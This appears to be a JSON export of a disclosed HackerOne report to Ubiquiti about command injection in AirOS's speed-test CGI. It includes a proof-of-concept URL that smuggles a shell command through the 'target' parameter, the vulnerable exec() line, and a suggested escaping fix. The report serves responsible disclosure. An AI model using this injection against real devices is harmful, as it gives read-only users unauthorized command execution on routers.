{"id":119317,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTkzMTc=","url":"https://hackerone.com/reports/119317","title":"Read-Only user can execute arbitraty shell commands on AirOS","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-02-28T19:21:10.574Z","submitted_at":"2016-02-28T19:21:10.574Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"93c08539","url":"/93c08539","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":800,"url":"https://hackerone.com/ui","handle":"ui","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/800/449ca06f77c3e1dd1979bae1e5f16150334f7479_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/800/449ca06f77c3e1dd1979bae1e5f16150334f7479_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Ubiquiti Inc.","twitter_handle":"ubnt","website":"https://ui.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-08-05T09:36:35.197Z","bug_reporter_agreed_on_going_public_at":"2016-07-06T09:36:33.294Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"On the last version of AirOS (including the 8.0 beta) is possible to a read-only user to inject shell commands.\n\nIs possible to exploit the vulnerability using the following URL (adjusting the `airosid` value to a valid session):\n```\nhttps://192.168.0.21/sptest_action.cgi?ticket=426\u0026action=start\u0026target=192.168.0.100%3Btouch%20/tmp/vulnerable%3B\u0026port=80\u0026airosid=30171452416bb910e94ce2f802d73b89\u0026_=1456685928091\n```\n\n\nThe vulnerability happen in the 'sptest.inc:46', that don't sanitizes the user input. The Vulnerable code:\n```\nexec(\"echo \" + $ticket + \" init \" + $target + \" \u003e /proc/net/spdtst/stctl\", $lines, $res);\n```\n\nPossible mitigation:\n```\nexec(\"echo \" + EscapeShellCmd($ticket) + \" init \" + EscapeShellCmd($target) + \" \u003e /proc/net/spdtst/stctl\", $lines, $res);\n```","vulnerability_information_html":"\u003cp\u003eOn the last version of AirOS (including the 8.0 beta) is possible to a read-only user to inject shell commands.\u003c/p\u003e\n\n\u003cp\u003eIs possible to exploit the vulnerability using the following URL (adjusting the \u003ccode\u003eairosid\u003c/code\u003e value to a valid session):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://192.168.0.21/sptest_action.cgi?ticket=426\u0026amp;action=start\u0026amp;target=192.168.0.100%3Btouch%20/tmp/vulnerable%3B\u0026amp;port=80\u0026amp;airosid=30171452416bb910e94ce2f802d73b89\u0026amp;_=1456685928091\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe vulnerability happen in the \u0026#39;sptest.inc:46\u0026#39;, that don\u0026#39;t sanitizes the user input. The Vulnerable code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eexec(\u0026quot;echo \u0026quot; + $ticket + \u0026quot; init \u0026quot; + $target + \u0026quot; \u0026gt; /proc/net/spdtst/stctl\u0026quot;, $lines, $res);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePossible mitigation:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eexec(\u0026quot;echo \u0026quot; + EscapeShellCmd($ticket) + \u0026quot; init \u0026quot; + EscapeShellCmd($target) + \u0026quot; \u0026gt; /proc/net/spdtst/stctl\u0026quot;, $lines, $res);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"1500.0","formatted_bounty":"$1,500","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-08-05T09:36:33.519Z","allow_singular_disclosure_after":-138825801.48149788,"singular_disclosure_allowed":true,"vote_count":17,"voters":["zoom7","93c08539","jahrek","vijay_kumar","harry_mg","ibram","temmyscript","craig","mvbk1991","martijn","and 7 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":817546,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2016-02-29T19:22:11.217Z","updated_at":"2016-02-29T19:22:11.217Z","actor":{"username":"ubnt-james","cleared":false,"url":"/ubnt-james","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":873492,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Fixed on `airOS v8.0-beta9`","markdown_message":"\u003cp\u003eFixed on \u003ccode\u003eairOS v8.0-beta9\u003c/code\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-03-27T21:01:08.445Z","updated_at":"2016-03-27T21:01:08.445Z","actor":{"username":"93c08539","cleared":false,"url":"/93c08539","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":878797,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"HI There,\n\nThanks again for the submission.   If you are going to request public disclosure for this submission, please wait until 8.0 is released as stable.\n\nYou can subscribe to our airMAX release blog (if you like) to get an email for new stable releases.\n\n\nhttp://community.ubnt.com/t5/airMAX-Updates-Blog/bg-p/Blog_airMAX\n\n\n","markdown_message":"\u003cp\u003eHI There,\u003c/p\u003e\n\n\u003cp\u003eThanks again for the submission.   If you are going to request public disclosure for this submission, please wait until 8.0 is released as stable.\u003c/p\u003e\n\n\u003cp\u003eYou can subscribe to our airMAX release blog (if you like) to get an email for new stable releases.\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://community.ubnt.com/t5/airMAX-Updates-Blog/bg-p/Blog_airMAX\" href=\"/redirect?url=http%3A%2F%2Fcommunity.ubnt.com%2Ft5%2FairMAX-Updates-Blog%2Fbg-p%2FBlog_airMAX\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://community.ubnt.com/t5/airMAX-Updates-Blog/bg-p/Blog_airMAX\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-03-30T20:13:15.303Z","updated_at":"2016-03-30T20:13:15.303Z","actor":{"url":"/ui","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/800/449ca06f77c3e1dd1979bae1e5f16150334f7479_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ubiquiti Inc."}},"bounty_amount":"1500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ui","collaborator":{"username":"93c08539","url":"/93c08539"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":878798,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-30T20:13:22.914Z","updated_at":"2016-03-30T20:13:22.914Z","actor":{"username":"ubnt-james","cleared":false,"url":"/ubnt-james","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"93c08539","url":"/93c08539"},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1055267,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Fixed in the last stable version","markdown_message":"\u003cp\u003eFixed in the last stable version\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-06T09:36:33.344Z","updated_at":"2016-07-06T09:36:33.344Z","first_to_agree":true,"actor":{"username":"93c08539","cleared":false,"url":"/93c08539","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/033/613/8c3e2d95cf9be1554d0d1e8de292b45c73325047_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1107856,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-05T09:36:35.352Z","updated_at":"2016-08-05T09:36:35.352Z","actor":{"url":"/ui","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/800/449ca06f77c3e1dd1979bae1e5f16150334f7479_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ubiquiti Inc."}},"genius_execution_id":null,"team_handle":"ui","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":2293,"category":"researcher","content":"This report is the first of a series of three: #119317, #128750 and #139398.\nThe researcher demonstrates how a read-only user can execute shell commands on a AirOS router.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eThis report is the first of a series of three: \u003ca href=\"/reports/119317\"\u003e#119317\u003c/a\u003e, \u003ca href=\"/reports/128750\"\u003e#128750\u003c/a\u003e and \u003ca href=\"/reports/139398\"\u003e#139398\u003c/a\u003e.\u003cbr\u003e\nThe researcher demonstrates how a read-only user can execute shell commands on a AirOS router.\u003c/p\u003e\n"}]}